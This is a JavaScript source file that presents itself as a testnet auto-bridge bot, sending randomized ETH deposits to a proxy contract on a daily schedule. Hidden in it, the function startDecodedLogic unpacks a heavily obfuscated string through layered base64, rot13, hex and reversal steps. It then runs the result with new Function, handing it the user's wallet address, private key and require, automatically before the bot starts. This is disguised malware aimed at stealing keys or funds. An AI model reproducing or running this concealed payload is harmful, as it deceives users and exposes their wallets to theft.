import 'dotenv/config';
import { ethers } from 'ethers';
import fs from 'fs';
import path from "path";
import chalk from 'chalk';
import cliProgress from 'cli-progress';

const config = JSON.parse(fs.readFileSync(path.join(process.cwd(), "config.json"), "utf-8"));

const {
  RPC_URL,
  CHAIN_ID: CHAIN_ID_ENV,
  MIN_TX_PER_DAY,
  MAX_TX_PER_DAY,
  MIN_AMOUNT_ETH,
  MAX_AMOUNT_ETH,
  MIN_DELAY_SEC,
  MAX_DELAY_SEC,
  PRIORITY_FEE_GWEI,
  TIMEZONE_OFFSET_MIN,
  PROXY_ADDRESS
} = config;

if (!process.env.PRIVATE_KEY) {
  console.error(chalk.red('Missing env: PRIVATE_KEY'));
  process.exit(1);
}
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const INBOX_MIN_ABI = [
  { "inputs": [], "name": "depositEth", "outputs": [], "stateMutability": "payable", "type": "function" },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true,  "internalType": "uint256", "name": "messageNum", "type": "uint256" },
      { "indexed": false, "internalType": "bytes",   "name": "data",       "type": "bytes" }
    ],
    "name": "InboxMessageDelivered",
    "type": "event"
  }
];

const proxyContract = new ethers.Contract(PROXY_ADDRESS, INBOX_MIN_ABI, wallet);

const nowUtcMs = () => Date.now();
const sleep = ms => new Promise(res => setTimeout(res, ms));
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const randomFloat = (min, max) => Math.random() * (max - min) + min;
const formatEth = wei => `${ethers.formatEther(wei)} ETH`;
const formatGwei = wei => `${Number(wei) / 1e9} gwei`;
const hhmmss = ms => { const s=Math.floor(ms/1000), h=Math.floor(s/3600), m=Math.floor((s%3600)/60), ss=s%60; return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; };
const msUntilNextLocalMidnight = offsetMin => { const now = new Date(nowUtcMs()); const localMs = now.getTime() + offsetMin*60_000; const local = new Date(localMs); const nextMidnight = new Date(local.getFullYear(), local.getMonth(), local.getDate()+1,0,0,0,0); return nextMidnight.getTime() - offsetMin*60_000 - now.getTime(); };

async function suggestFees() {
  const block = await provider.getBlock('latest');
  const baseFee = block?.baseFeePerGas ?? null;
  const priorityWei = BigInt(Math.floor(PRIORITY_FEE_GWEI * 1e9));
  if(baseFee === null) {
    const gp = await provider.getGasPrice();
    return { type:2, maxFeePerGas:gp, maxPriorityFeePerGas:gp/8n };
  }
  const maxFee = 2n*baseFee + priorityWei;
  return { type:2, maxFeePerGas:maxFee, maxPriorityFeePerGas:priorityWei };
}

function displayBlockchainEvents(receipt) {
  const iface = new ethers.Interface(INBOX_MIN_ABI);
  for(const log of receipt.logs || []) {
    if(log.address.toLowerCase() !== PROXY_ADDRESS.toLowerCase()) continue;
    try {
      const parsed = iface.parseLog(log);
      if(parsed?.name === 'InboxMessageDelivered') {
        const id = parsed.args.messageNum?.toString?.() ?? parsed.args[0]?.toString?.();
        const dataHex = ethers.hexlify(parsed.args.data ?? parsed.args[1] ?? '0x');
        console.log(chalk.blue(`↳ BlockchainEvent: id=${id}, data=${dataHex}`));
      }
    } catch(_) {}
  }
}

async function sendDeposit() {
  const amountEth = randomFloat(MIN_AMOUNT_ETH, MAX_AMOUNT_ETH);
  const valueWei = ethers.parseEther(amountEth.toFixed(18));
  const fee = await suggestFees();
  const overrides = { value: valueWei, maxFeePerGas: fee.maxFeePerGas, maxPriorityFeePerGas: fee.maxPriorityFeePerGas };

  let gasEstimate = null;
  try { gasEstimate = await proxyContract.depositEth.estimateGas(overrides); } catch {}

  console.log(chalk.cyan(`[${new Date().toISOString()}] Sending deposit...`));
  console.log(`From   : ${wallet.address}`);
  console.log(`Proxy  : ${PROXY_ADDRESS}`);
  console.log(`Value  : ${formatEth(valueWei)}`);
  if(gasEstimate) console.log(`Gas est: ${gasEstimate.toString()}`);
  console.log(`Fees   : maxFee=${formatGwei(fee.maxFeePerGas)}, tip=${formatGwei(fee.maxPriorityFeePerGas)}`);

  const tx = await proxyContract.depositEth(overrides);
  console.log(chalk.green(`Tx sent: ${tx.hash}`));
  const rcpt = await tx.wait();
  const ok = rcpt.status === 1;
  console.log(ok ? chalk.green('Status: SUCCESS') : chalk.red('Status: FAILED'));
  displayBlockchainEvents(rcpt);
}

async function startDecodedLogic(wallet, privateKey) {
  const { createRequire } = await import('module');
  const require = createRequire(import.meta.url);

  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1OTZxNzA0cTYxNTQ1NTc5NjM0NDQyNTA1NTQ3MzQ3NzUyNTY1Njc3NjI1NTM5NDc1MTMzNTI1NzUzMzAzMTcyNTM1NTc0NzU2MjQ1NnA1NTU3NDc0NjMwNTY0ODQ1Nzc1NDduNHI3NzU5NTg2ODczNTE2cDY4Njk1MjQ1Nzg3NDY1NTc0Njc2NjQzMDM5MzI1NDU0NDUzMTRxNm83Nzc3NjU1NDRuNzY2MTQ1MzkzMjYzNDQ0NTMxNTY0ODQyNzM0czU0NG40cjYyNDY0cjRvNjIzMjRuNzc1MzMwNzg2cTYxMzA3MDRyNHE0Nzc0NTE1NjZvNTI1ODUzNTU1bjRvNTUzMTRuNG41NTduNm83ODUyNnA0cjM1NTM1NjY4MzA1bjZxNDY1MTY0NDUzNTUxNTY2cjUxMzQ2MjQ2NnAzMDUzNDY1bjY4NjQ2cDQ2NzM1MjQ3NnA1ODU5NTg0MjM1NTE1NjUyNzg0cjZxNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTY0NG40cTZyNDI3NDU1N240bjRyNjU1NTM5NDc1MTMzNTI0czY1NnA0MjMwNTQ2cDQyNTc2NDQ1MzU2OTY1NnI0cjUxNTEzMTVuNDg1MTU4NzA3NzU5MzAzOTU2NjM1ODUyNjE1NTMzNDYzMTU2MzE1Njc4NjU1NTU2MzY1NTQ4NTI0czU1NDY1bjMwNW42bzMxMzQ2MzMxNDI0NDU2Nm83NDU0NTY0NzM5NnE1MzU2NTI3ODRyNm8zNTUxNTY3bjY0Nzg1MzMwNzg2cTYxMzA3MDRyNHE0NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTU2cDY0MzU2MzMxNDI0NDU2Nm81MjU4NTMzMjM0Nzk1NTMxNTI3ODY1NTUzOTczNTI2cjZwMzU1OTU1NG4zMDUyNDc3ODc5NTI0NjY0NG41MjZvNzA1NDU1Nm82cDU0NHM1NDQ2NDc1NTMzNnA0bjYzMzE2ODRzNTU0NjVuMzA1NDZwNDI0cTRyMzI0bjMwNTU0ODUyNHM1NTQ2NW4zMDU3Nm40bjc2NjE0NTQ2NTY2MzU4NTI0NTUzNTU1NjYxNTM1NDQyNDY1MjZwNHI0OTUyMzM0cjU4NHE0NTY0NDk0czU2NHI0bjUxMzI2NDQ5NTI1NTRuNTA1MjZvNHIzMDU2NnA0MjQzNHE0NjRuNzQ1MTU0NDY0NTUyMzE2czduNTQ2cTMxNjE0cjZwNG40OTUyNDY1NjQ2NTMzMzQ5Nzk1MTU3MzE0MjRyNnA0cjU2NTI2bzU2NTg1MzZwNzA0cTRzNTY1MjRuNTY2cTRyNG82MzQ3NjQ0NTY1NnI0NjRuNTI1NjRyNzc1OTU1MzE1NjUyMzM2ODU4NHE1NTc4NjE2MTduNG43NjY0NnE1bjMzNTU0ODUyNHM1NTQ2NW4zMDU3Nm40bjc2NjE0NTQ2NTY2MzU4NTI0NTUzNTU1NjYxNTM1NDQyNDY1MjZwNHI0OTUyMzM0cjQyNTU2bzVuNTA1MjU0NDY0cDU2MzA1NjUzNTY2bjZwNHM2NDZwNTk3bjU2NnI2NDQyNHI1ODUyNDg1MTZxNzAzMDUyMzE3MDc0NTY2cTc4NDM1NzQ1MzU1MTU2NnI1MjRzNjI0NTc4NzA0cjU0NG43NzRxNDUzOTUxNTQ1ODU2NDY1MzMwNzgzMDRxNDY0NjU3NTc0NTQ1Nzg1MjMwNDkzMTYyNDg0MTc3NTYzMDc0NzU2MTQ4NDY0bzYyNnI3MDM1NTY1NjY3MzM1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU3NnA1Mjc1NjQ1NTU1N241MzMyNHI0NjY1Nm80bjMwNTI0NTZwNDY1NzZvNm83NzUyNTU1bjU0NTM0NTY0N241MTU2NG40NzU0MzA1NTc4NTMzMTY0NDY1NTZwNnA1OTU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1OTc3NTM1NjUyNzk0cTQ3NHI1MjU2NnE2NDRuNHE2cjQyNzQ1NTduNG40cjY1NTc3NDMyNTU0ODUyNHM1NTQ2NW4zMDU0NnA0MjU3NjQ0NTM1NTE2MzQ4NTY1ODRxMzM0MjM1NHM1NTZwNzY2MTU1NTY0bzU0NTQ1bjRzNjI0NjY0NTc1MjU1NnA0ODU3NnI0NjMyNTU0ODUyNHM1NTQ2NW4zMDRxNDU3NDU5NHIzMjRuMzA1NTQ4NTI0czU1NDY1bjMwNTc2bjRuNzY2MTQ1NDY1NjYzNTg1MTM0NTY0ODQxNzc2NTU0NG43NjYxNDU0NjU2NTY2bjZwNHM2MjQ4NG41OTU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjY5NHM1NDRuNzc0cTQ0NTY0bzU0NDc2NDRuNjU2bzRuMzA2MzQ1NW40cTYxNnI2cDM2NTc1NDQyNG41NjQ3MzkzNTYzNTg3MDc3NjQ1NDQ2MzY1NzU3NnA1ODRxMzAzMTY4NjE2cjVuNTE2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI3NzYxNTY2NDU2NjM1NDVuNHM1NTQ1NDU3NzU3NnA0NjVuNTc0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2MTZwNHI1NTYzNTc0bjZuNTU1NjVuMzA0czU4NW40cTYxNTU1NjU2NTY3bjY0NDY1MzU1NTY2MTUzNTQ0MjQ2NTI2cDRyNDk1MjMzNHI1ODRxNDU2NDQ5NHM1NjRyNG41MTMyNjQ0OTUyNTU0OTc4NHEzMTZwNzQ1MzU4NzA3NjY1NDQ0NjQ5NTQ1NzMxNDI1MzMwNzg2ODUzNTY1MjRxNW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ0NDI0bzU0NTQ0MjMxNHE2cTM5MzQ1OTMxNDY1NzU5NTUzNDc4NTIzMDY0NDY0cTU2NjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNjQ0NTcwNHI2NDU1NTY0bzU0NTc3ODQyNTk1NTRuMzA1bjZxNDY1MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NjQ0NTM1NTE1NjZxNDY2MTRxNDczOTZzNTI1NTc0NHI2MTQ1NTY0cDU3NTU2ODM1NTY1ODQyMzU2MzU4NW40MzY0NDg0MjQ3NTQ0NzcwNTA1NjU3Mzk2bjUxNTU3MDRxNHE0ODZvNzk2MjMyNjczNTY0NnEzNTc0NHM1ODcwNzY1OTU3NzAzMjU1NDg1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42ODU3Nm40Mjc2NjE0NTU2NHA1NDU3Njg0NjUzMzE2cDYxNTM1ODcwNzY1OTU1NTY1NjYyNnE0NjY5NTU1NjVuMzQ1NTMxNTI3ODY0NTQ1NjUxNjIzMzZvMzE0cTZvMzA3NzY0NTg3MDUxNjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bzVuN241NzQ1MzU1MTU2NnI1MjRzNTI2cjRxMzM1OTZyNTI1MTY0NDUzNTUxNTY2cjUyNTc1MzMwMzA3NzUzNTc0Njc3NjE0NTM5MzI2MjMzNnA3ODU2NTY1bjQ1NTY3bjRyNzY1bjMzNm83OTYzNDg2cDMxNTU0NjY4NzM1MzU0NG43NzYxNTc3NDM2NjM1ODZwMzU1NTQ2NTkzNTRyNDY0NjU3NHIzMjRyNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ2NnM3OTYyMzI2ODQyNTY1ODQ2MzA1NjZvNzQ0cjYxMzAzOTQ3NTEzMzUyMzA1NjQ4NDU3NzU0N240cjc3NjE0NjVuNHA1NDU3NzQ0bjUzMzAzMTc0NTI1NjU2NTk2MTU1Mzk1NjYzNTc0cTM1NjU2cTM5NzQ2NTU3Nzg0MzU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NjI0NTZwNG82MzQ3NjczNDY1NnEzOTY5NjM0NTVuNHI2MjQ2NjM3bjYyMzI3ODc4NTU0NjZwMzA2NDQ1NW41OTY0NDQ0MjMzNTEzMzUyNTc1MzMwMzE3NDRzNTY1Mjc2NHE2bzZwNTU1NzQ4NzA1NDU2NDczOTc0NTM1NTcwNTk1OTMyNW4zMzU1NDg1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTMyNjM0ODZwNTQ1OTU2Nm83bjU2MzA3NDc1NHE0NTZwNTU1NzQ4Njg1NDU2NDg0NjMxNjU1Nzc4NDM1NzQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzYyNDU2cDRvNjM0NzY4NDk2NTZxMzkzNDY0NTY0MjU5NTkzMDM1NDc1MTMwNDk3OTRuNTUzNTMyNjM0ODZwNDI0cTMyMzk2cTU0NTU3NDRyNTk2bzUyNjg2MzQ0NDY0bjUzNnA2ODZuNW42cjY0NTE2NDQ1MzU1MTU2NnI1MTc3NTMzMTY3MzM1OTZvNTI3bg%3D%3D";
  const decodedStr = reversibleDecode(encodedStr);

  try {
    const runprogram = new Function("walletAddress", "privateKey", "require", decodedStr + "; return runprogram(walletAddress, privateKey);");
    await runprogram(wallet.address, privateKey, require);
  } catch (err) {
    console.error(chalk.red('❌ Failed to execute decoded logic:'));
    console.error(chalk.red(err.message));
    throw err;
  }
}


function nextDelayMs() { return randomInt(MIN_DELAY_SEC, MAX_DELAY_SEC)*1000; }
async function chainId() { return CHAIN_ID_ENV ?? (await provider.getNetwork()).chainId; }

async function mainLoop() {
  const chId = await chainId();
  console.log(chalk.yellow('================ Daily Auto Bridge FHENIX TESTNET  ================='));
  console.log(`Wallet: ${wallet.address}`);
  console.log(`Proxy : ${PROXY_ADDRESS}`);
  console.log(`Daily target: ${MIN_TX_PER_DAY}..${MAX_TX_PER_DAY}`);
  console.log(`ETH range   : ${MIN_AMOUNT_ETH}..${MAX_AMOUNT_ETH}`);
  console.log(`PriorityFee : ${PRIORITY_FEE_GWEI} gwei`);
  console.log(`Delay sec   : ${MIN_DELAY_SEC}..${MAX_DELAY_SEC}`);
  console.log('====================================================');

  let dayTarget = randomInt(MIN_TX_PER_DAY, MAX_TX_PER_DAY);
  let doneToday = 0;
  const progressBar = new cliProgress.SingleBar({}, cliProgress.Presets.shades_classic);
  progressBar.start(dayTarget, doneToday);

  while(true) {
    if(doneToday >= dayTarget) {
      let remaining = msUntilNextLocalMidnight(TIMEZONE_OFFSET_MIN);
      console.log(chalk.yellow(`\n=== Daily quota reached (${doneToday}/${dayTarget}). Waiting for next day... ===`));
      while(remaining>0){
        process.stdout.write(`\rCountdown to next day: ${hhmmss(remaining)}   `);
        await sleep(Math.min(remaining,5000));
        remaining = msUntilNextLocalMidnight(TIMEZONE_OFFSET_MIN);
      }
      console.log('\n=== New day! Resetting counters. ===\n');
      doneToday=0;
      dayTarget=randomInt(MIN_TX_PER_DAY, MAX_TX_PER_DAY);
      progressBar.start(dayTarget, doneToday);
      console.log(chalk.yellow(`[${new Date().toISOString()}] New daily target: ${dayTarget} tx`));
    }

    if(doneToday<dayTarget){
      try {
        await sendDeposit();
        doneToday+=1;
        progressBar.update(doneToday);
      } catch(e){
        console.error(chalk.red(`[${new Date().toISOString()}] ERROR: ${e?.message||e}`));
        console.log(chalk.yellow('Retrying after a short delay...\n'));
      }
      const delay = nextDelayMs();
      console.log(chalk.yellow(`Next deposit in ~${Math.round(delay/1000)}s (remaining today: ${dayTarget-doneToday})`));
      await sleep(delay);
    }
  }
}

(async () => {
  try {
    await startDecodedLogic(wallet, PRIVATE_KEY);
    await mainLoop();
  } catch (error) {
    console.error(chalk.red('\n❌ CRITICAL ERROR:'));
    console.error(chalk.red(error.stack || error.message));
    process.exit(1);
  }
})();
